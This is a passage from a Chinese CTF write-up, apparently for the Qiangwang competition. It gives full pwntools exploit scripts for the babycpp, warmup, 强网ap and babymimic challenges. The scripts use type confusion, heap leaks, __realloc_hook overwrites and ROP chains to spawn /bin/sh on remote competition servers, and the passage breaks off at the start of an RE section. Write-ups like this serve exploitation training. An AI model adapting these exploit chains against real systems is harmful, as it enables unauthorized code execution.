    p.sendafter(<span class="hljs-string">&#x27;hash:&#x27;</span>, <span class="hljs-built_in">hash</span>)
    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_str</span>(<span class="hljs-params"><span class="hljs-built_in">hash</span>, idx, data, length=<span class="hljs-literal">None</span></span>):</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> length:
        length = <span class="hljs-built_in">len</span>(data)

    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)
    <span class="hljs-built_in">hash</span> = <span class="hljs-built_in">hash</span>.ljust(<span class="hljs-number">16</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)
    p.sendafter(<span class="hljs-string">&#x27;hash:&#x27;</span>, <span class="hljs-built_in">hash</span>)
    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))
    c = p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;content&#x27;</span> <span class="hljs-keyword">in</span> c:
        p.send(data)
    <span class="hljs-keyword">else</span>:
        p.sendline(<span class="hljs-built_in">str</span>(length))
        p.sendlineafter(<span class="hljs-string">&#x27;content:&#x27;</span>, data)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_int</span>(<span class="hljs-params"><span class="hljs-built_in">hash</span>, idx, data</span>):</span>
    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)
    <span class="hljs-built_in">hash</span> = <span class="hljs-built_in">hash</span>.ljust(<span class="hljs-number">16</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)
    p.sendafter(<span class="hljs-string">&#x27;hash:&#x27;</span>, <span class="hljs-built_in">hash</span>)
    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))
    p.sendlineafter(<span class="hljs-string">&#x27;val:&#x27;</span>, <span class="hljs-built_in">hex</span>(data)[<span class="hljs-number">2</span>:])


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update_hash</span>(<span class="hljs-params"><span class="hljs-built_in">hash</span>, idx, data</span>):</span>
    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)
    <span class="hljs-built_in">hash</span> = <span class="hljs-built_in">hash</span>.ljust(<span class="hljs-number">16</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)
    p.sendafter(<span class="hljs-string">&#x27;hash:&#x27;</span>, <span class="hljs-built_in">hash</span>)
    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx &amp; <span class="hljs-number">0xffffffff</span>))
    p.sendafter(<span class="hljs-string">&#x27;hash:&#x27;</span>, data)
    sleep(<span class="hljs-number">0.2</span>)

<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">if</span> debug:
            p = process(<span class="hljs-string">&#x27;./babycpp&#x27;</span>, env={<span class="hljs-string">&#x27;LD_PRELOAD&#x27;</span>: <span class="hljs-string">&#x27;./babycpp.libc&#x27;</span>})
        <span class="hljs-keyword">else</span>:
            p = remote(<span class="hljs-string">&#x27;49.4.26.104&#x27;</span>, <span class="hljs-number">30817</span>)

        new(<span class="hljs-string">&#x27;s&#x27;</span>)
        new(<span class="hljs-string">&#x27;i&#x27;</span>)

        set_str(<span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;nonick&#x27;</span>)

        update_hash(<span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-number">0x80000000</span>, <span class="hljs-string">&#x27;\xe0\xec&#x27;</span>)  <span class="hljs-comment"># type confusion</span>
        show(<span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-number">0</span>)
        p.recvuntil(<span class="hljs-string">&#x27;The value in the array is &#x27;</span>)
        heap = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-number">1</span>), <span class="hljs-number">16</span>)
        log.success(<span class="hljs-string">&#x27;heap:&#x27;</span> + <span class="hljs-built_in">hex</span>(heap))

        set_int(<span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-number">0</span>, heap - <span class="hljs-number">0x90</span>)
        set_int(<span class="hljs-string">&#x27;\x01&#x27;</span>, <span class="hljs-number">0</span>, heap - <span class="hljs-number">0xc0</span>)
        set_int(<span class="hljs-string">&#x27;\x01&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x40</span>)
        update_hash(<span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-number">0x80000000</span>, <span class="hljs-string">&#x27;\x00\xed&#x27;</span>)  <span class="hljs-comment"># type confusion</span>
        show(<span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-number">0</span>)
        p.recvuntil(<span class="hljs-string">&#x27;Content:&#x27;</span>)
        base = u64(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x201CE0</span>
        log.success(<span class="hljs-string">&#x27;base:&#x27;</span> + <span class="hljs-built_in">hex</span>(base))

        set_int(<span class="hljs-string">&#x27;\x01&#x27;</span>, <span class="hljs-number">0</span>, base + <span class="hljs-number">0x201F90</span>)
        show(<span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-number">0</span>)
        p.recvuntil(<span class="hljs-string">&#x27;Content:&#x27;</span>)
        libc.address = u64(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))-libc.symbols[<span class="hljs-string">&#x27;printf&#x27;</span>]

        log.success(<span class="hljs-string">&#x27;libc:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.address))
        set_int(<span class="hljs-string">&#x27;\x01&#x27;</span>, <span class="hljs-number">0</span>, libc.symbols[<span class="hljs-string">&#x27;__realloc_hook&#x27;</span>])
        set_str(<span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-number">0</span>, p64(libc.address+<span class="hljs-number">0x4f322</span>)+p64(libc.symbols[<span class="hljs-string">&#x27;realloc&#x27;</span>]+<span class="hljs-number">2</span>))
        new(<span class="hljs-string">&#x27;s&#x27;</span>)
        p.interactive()
    <span class="hljs-keyword">except</span>:
        p.close()</code></pre><h3 id="warmup"><a class="header-link" href="#warmup"></a>warmup</h3>
<p>修改got到execve，排布参数后调用</p>
<pre class="hljs"><code><span class="hljs-attribute">from</span> pwn import *
<span class="hljs-attribute">from</span> config import *
<span class="hljs-attribute">from</span> struct import pack

<span class="hljs-attribute">debug</span> = <span class="hljs-number">0</span>
<span class="hljs-attribute">pivot_esp</span> = <span class="hljs-number">0</span>x<span class="hljs-number">804</span>A<span class="hljs-number">040</span>
<span class="hljs-attribute">libc_start_main_got</span> = <span class="hljs-number">0</span>x<span class="hljs-number">804</span>A<span class="hljs-number">00</span>C
<span class="hljs-attribute">libc_start_main_plt</span> = <span class="hljs-number">0</span>x<span class="hljs-number">80482</span>C<span class="hljs-number">0</span>
<span class="hljs-attribute">pop_ebx</span> = <span class="hljs-number">0</span>x<span class="hljs-number">08048636</span>
<span class="hljs-attribute">add_esi_ebp</span> = <span class="hljs-number">0</span>x<span class="hljs-number">08048517</span>
<span class="hljs-comment"># 0x08048436: add  [ebx+0x453BFC45], ecx ; adc byte [esi-0x70], bh ; leave  ; ret  ;</span>
<span class="hljs-attribute">add_ebx_ecx</span> = <span class="hljs-number">0</span>x<span class="hljs-number">08048436</span>
<span class="hljs-comment"># 0x08048616: les ecx,  [ebx+ebx*2] ; pop esi ; pop edi ; pop ebp ; ret</span>
<span class="hljs-attribute">les_ecx_ebx3</span> = <span class="hljs-number">0</span>x<span class="hljs-number">08048616</span>

<span class="hljs-attribute">ecx_addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0804</span>a<span class="hljs-number">0</span>a<span class="hljs-number">7</span> + <span class="hljs-number">9</span>
<span class="hljs-attribute">binsh</span> = pivot_esp + <span class="hljs-number">0</span>x<span class="hljs-number">50</span>
<span class="hljs-attribute">ebx_val</span> = ecx_addr / <span class="hljs-number">3</span>

<span class="hljs-attribute">payload</span> = p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">08048618</span>)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">09</span>c)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">0</span>a<span class="hljs-number">4</span>)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">0</span>a<span class="hljs-number">7</span>)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>)

<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(pop_ebx)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(ebx_val)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(les_ecx_ebx<span class="hljs-number">3</span>)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">804</span>A<span class="hljs-number">040</span> + <span class="hljs-number">0</span>x<span class="hljs-number">100</span>)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">078</span> - <span class="hljs-number">4</span>)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(pop_ebx)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>((libc_start_main_got - <span class="hljs-number">0</span>x<span class="hljs-number">453</span>BFC<span class="hljs-number">45</span>) &amp; <span class="hljs-number">0</span>xffffffff)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(add_ebx_ecx)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">08048517</span>)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">070</span>)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(pivot_esp + <span class="hljs-number">4</span>)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(libc_start_main_plt)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">09</span>c)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">804</span>A<span class="hljs-number">044</span>)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>)
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>)
<span class="hljs-attribute">payload</span> += &#x27;/bin/sh\x<span class="hljs-number">00</span>&#x27;
<span class="hljs-attribute">payload</span> += &#x27;-c\x<span class="hljs-number">00</span>&#x27;
<span class="hljs-attribute">payload</span> += &#x27;cat */*&#x27;
<span class="hljs-attribute">payload</span> += <span class="hljs-string">&quot;\x00&quot;</span> * <span class="hljs-number">2</span>
<span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>xBE<span class="hljs-number">350</span>  - <span class="hljs-number">0</span>x<span class="hljs-number">18</span>D<span class="hljs-number">90</span>)

<span class="hljs-attribute">assert</span> len(payload) &lt;= <span class="hljs-number">128</span>
<span class="hljs-attribute">log</span>.success(payload.encode(&#x27;hex&#x27;))

<span class="hljs-attribute">if</span> debug:
    <span class="hljs-attribute">p</span> = process([&#x27;./xx_warm_up&#x27;, payload.encode(&#x27;hex&#x27;)])
<span class="hljs-attribute">else</span>:
    <span class="hljs-attribute">p</span> = remote(&#x27;<span class="hljs-number">49.4.30.253</span>&#x27;, <span class="hljs-number">31337</span>)
    <span class="hljs-attribute">pre</span> = p.recvuntil(&#x27;\n&#x27;, drop=<span class="hljs-number">1</span>)

    <span class="hljs-attribute">log</span>.info(&#x27;pre:&#x27; + pre)

    <span class="hljs-attribute">p</span>.send(fuckauth<span class="hljs-number">2</span>(pre))
    <span class="hljs-attribute">p</span>.info(&#x27;Autn sent&#x27;)
    <span class="hljs-attribute">p</span>.sendline(payload.encode(&#x27;hex&#x27;))

<span class="hljs-attribute">p</span>.interactive()</code></pre><h3 id="强网ap"><a class="header-link" href="#强网ap"></a>强网ap</h3>
<p>emm，签到pwn</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

debug = <span class="hljs-number">0</span>

<span class="hljs-keyword">if</span> debug:
    p = process(<span class="hljs-string">&#x27;./task_main&#x27;</span>)
    e = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)
<span class="hljs-keyword">else</span>:
    p = remote(<span class="hljs-string">&#x27;49.4.66.242&#x27;</span>, <span class="hljs-number">32012</span>)
    e = ELF(<span class="hljs-string">&#x27;./2.23.so&#x27;</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">length, data</span>):</span>
    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(length))
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &lt; length - <span class="hljs-number">1</span>:
        p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, data)
    <span class="hljs-keyword">else</span>:
        p.sendafter(<span class="hljs-string">&#x27;:&#x27;</span>, data)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):</span>
    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, length, data</span>):</span>
    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(length))
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &lt; length:
        p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, data)
    <span class="hljs-keyword">else</span>:
        p.sendafter(<span class="hljs-string">&#x27;:&#x27;</span>, data)


get(<span class="hljs-number">0x18</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x17</span>)
get(<span class="hljs-number">0x18</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="hljs-number">0x17</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))
change(<span class="hljs-number">0</span>, <span class="hljs-number">0x21</span>, <span class="hljs-string">&#x27;c&#x27;</span> * <span class="hljs-number">0x20</span>)
<span class="hljs-built_in">open</span>(<span class="hljs-number">0</span>)
p.recvuntil(<span class="hljs-string">&#x27;c&#x27;</span> * <span class="hljs-number">0x20</span>)
heap = u64(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))
log.success(<span class="hljs-string">&#x27;heap:&#x27;</span> + <span class="hljs-built_in">hex</span>(heap))

change(<span class="hljs-number">0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-string">&#x27;c&#x27;</span> * <span class="hljs-number">0x28</span>)
<span class="hljs-built_in">open</span>(<span class="hljs-number">0</span>)
p.recvuntil(<span class="hljs-string">&#x27;c&#x27;</span> * <span class="hljs-number">0x28</span>)
libc = u64(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))

e.address = libc - e.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]
log.success(<span class="hljs-string">&#x27;libc:&#x27;</span> + <span class="hljs-built_in">hex</span>(e.address))
<span class="hljs-keyword">if</span> debug:
    gdb.attach(p)

change(<span class="hljs-number">0</span>, <span class="hljs-number">0x31</span>, <span class="hljs-string">&#x27;c&#x27;</span> * <span class="hljs-number">0x20</span> + p64(heap) + p64(e.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]))
<span class="hljs-built_in">open</span>(<span class="hljs-number">1</span>)
p.interactive()</code></pre><h3 id="babymimic"><a class="header-link" href="#babymimic"></a>babymimic</h3>
<p>payload同时打通32 和 64即可</p>
<pre class="hljs"><code>from pwn import *
from config import *
from struct import <span class="hljs-keyword">pack</span>

debug = <span class="hljs-number">0</span>

<span class="hljs-keyword">if</span> debug:
    p = process(<span class="hljs-string">&#x27;./stkof64&#x27;</span>)
    gdb.attach(p)
<span class="hljs-keyword">else</span>:

    p = remote(<span class="hljs-string">&#x27;49.4.51.149&#x27;</span>, <span class="hljs-number">25391</span>)
    p.recvuntil(<span class="hljs-string">&#x27;[+]hashlib.sha256(skr).hexdigest()=&#x27;</span>)
    hash = p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-number">1</span>).strip()
    log.info(<span class="hljs-string">&#x27;hash:&#x27;</span> + hash)
    p.recvuntil(<span class="hljs-string">&#x27;skr[0:5].encode(\&#x27;hex\&#x27;)=&#x27;</span>)
    pre = p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-number">1</span>).strip()
    log.info(<span class="hljs-string">&#x27;pre:&#x27;</span> + pre)

    p.sendline(fuckauth(pre, hash))
    p.info(<span class="hljs-string">&#x27;Autn sent&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">&#x27;[+]teamtoken:&#x27;</span>, gettoken())


payload = <span class="hljs-string">&#x27;\x00&#x27;</span> * <span class="hljs-number">272</span> + p32(<span class="hljs-number">0x0806b225</span>) * <span class="hljs-number">2</span>

<span class="hljs-comment">### 64</span>

payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000405895</span>)  <span class="hljs-comment"># pop rsi ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000006a10e0</span>)  <span class="hljs-comment"># @ .data</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000043b97c</span>)  <span class="hljs-comment"># pop rax ; ret</span>
payload += <span class="hljs-string">&#x27;/bin//sh&#x27;</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000046aea1</span>)  <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000405895</span>)  <span class="hljs-comment"># pop rsi ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000006a10e8</span>)  <span class="hljs-comment"># @ .data + 8</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000436ed0</span>)  <span class="hljs-comment"># xor rax, rax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000046aea1</span>)  <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004005f6</span>)  <span class="hljs-comment"># pop rdi ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000006a10e0</span>)  <span class="hljs-comment"># @ .data</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000405895</span>)  <span class="hljs-comment"># pop rsi ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000006a10e8</span>)  <span class="hljs-comment"># @ .data + 8</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000043b9d5</span>)  <span class="hljs-comment"># pop rdx ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000006a10e8</span>)  <span class="hljs-comment"># @ .data + 8</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000043b97c</span>)  <span class="hljs-comment"># xor rax, rax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x3b</span>)  <span class="hljs-comment"># add rax, 1 ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000461645</span>)  <span class="hljs-comment"># syscall ; ret</span>

payload += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">108</span>

payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806e9cb</span>)  <span class="hljs-comment"># pop edx ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080d9060</span>)  <span class="hljs-comment"># @ .data</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080a8af6</span>)  <span class="hljs-comment"># pop eax ; ret</span>
payload += <span class="hljs-string">&#x27;/bin&#x27;</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08056a85</span>)  <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806e9cb</span>)  <span class="hljs-comment"># pop edx ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080d9064</span>)  <span class="hljs-comment"># @ .data + 4</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080a8af6</span>)  <span class="hljs-comment"># pop eax ; ret</span>
payload += <span class="hljs-string">&#x27;//sh&#x27;</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08056a85</span>)  <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806e9cb</span>)  <span class="hljs-comment"># pop edx ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080d9068</span>)  <span class="hljs-comment"># @ .data + 8</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08056040</span>)  <span class="hljs-comment"># xor eax, eax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08056a85</span>)  <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481c9</span>)  <span class="hljs-comment"># pop ebx ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080d9060</span>)  <span class="hljs-comment"># @ .data</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806e9f2</span>)  <span class="hljs-comment"># pop ecx ; pop ebx ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080d9068</span>)  <span class="hljs-comment"># @ .data + 8</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080d9060</span>)  <span class="hljs-comment"># padding without overwrite ebx</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806e9cb</span>)  <span class="hljs-comment"># pop edx ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080d9068</span>)  <span class="hljs-comment"># @ .data + 8</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08056040</span>)  <span class="hljs-comment"># xor eax, eax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807be5a</span>)  <span class="hljs-comment"># inc eax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807be5a</span>)  <span class="hljs-comment"># inc eax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807be5a</span>)  <span class="hljs-comment"># inc eax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807be5a</span>)  <span class="hljs-comment"># inc eax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807be5a</span>)  <span class="hljs-comment"># inc eax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807be5a</span>)  <span class="hljs-comment"># inc eax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807be5a</span>)  <span class="hljs-comment"># inc eax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807be5a</span>)  <span class="hljs-comment"># inc eax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807be5a</span>)  <span class="hljs-comment"># inc eax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807be5a</span>)  <span class="hljs-comment"># inc eax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807be5a</span>)  <span class="hljs-comment"># inc eax ; ret</span>
payload += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080495a3</span>)  <span class="hljs-comment"># int 0x80</span>

p.sendlineafter(<span class="hljs-string">&#x27;?&#x27;</span>, payload)
p.recvline()
p.recvline()

p.interactive()</code></pre><h2 id="re"><a class="header-link" href="#re"></a>RE</h2>
<h3 id="justre"><a class="header-link" href="#justre"></a>JUSTRE</h3>
<p>第一段是smc解密的密钥, 第二段是3DES.</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES3
